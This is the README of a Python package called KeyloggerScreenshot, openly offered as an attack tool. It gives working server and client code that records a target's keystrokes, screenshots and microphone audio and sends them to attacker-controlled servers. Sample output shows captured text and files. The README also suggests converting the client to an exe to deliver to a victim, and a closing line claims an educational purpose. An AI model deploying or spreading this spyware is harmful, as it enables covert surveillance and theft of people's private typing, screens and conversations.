KeyloggerScreenshot
===================

Created by: Fawaz Bashiru

KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Follow the instructions to build your own server in "KeyloggerScreenshot"

To install KeyloggerScreenshot simply type:

`pip install KeyloggerScreenshot`

In your terminal

HOW DOES KeyloggerScreenshot WORK?
==================================

This module can be used in Windows and Linux

The servers can now be run in the same file with the module threading

The port number for each server should be different

The server should obviously be run before the client

You can just copy the following code and insert you ip-address in the variable "ip"

You can find your ip-address in the command line by using the command "ipconfig"

For example:
===========
-------
Servers
------
```python
#EveryServer.py:
import KeyloggerScreenshot as ks
import threading

ip = "127.0.0.1"

ip_photos, port_photos = ip, 1111
server_photos = ks.ServerPhotos(ip_photos, port_photos)

ip_keylogger, port_keylogger = ip, 2222
server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)

ip_listener, port_listener = ip, 3333
server_listener = ks.ServerListener(ip_listener, port_listener)

ip_time, port_time = ip, 4444
server_time = ks.Timer(ip_time, port_time)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start()

```

Every screenshots, photos and audio files will be saved locally where your server is located even if the connection isn't stable. 

Client_Target
-------------
```python
#client_target.py
import KeyloggerScreenshot as ks

ip = "127.0.0.1"
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60)
key_client.start()

```

Output
------
```python
"""
Cyan: ServerPhotos
Blue: ServerKeylogger
Green: ServerListener
White: Timer


Waiting for connection....Waiting for connection...
Waiting for connection...

Connection has been established with the ip 127.0.0.1
Time left: 02:59

Connection has been established with ('127.0.0.1', 63822)
Time left: 00:01Connection has been established with ('127.0.0.1', 63842)

Successful connection for 3 minutes and 20 seconds
"Audio of target.wav" has been saved to your directory
Connection has been established with ('127.0.0.1', 63843)
Text of target: Hello this is a test 123. 123 Nice it works have fun  guys 
1 Image have been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63824)
2 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63825)
3 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63829)
4 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63841)
5 Images has been saved to your working directory
Waiting for connection...

"""
```

Your current directory
---------------------
![img.png](img.png)

Additional
==========
* You can send "client_target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* The servers can be used on any OS. The client should be a Windows OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.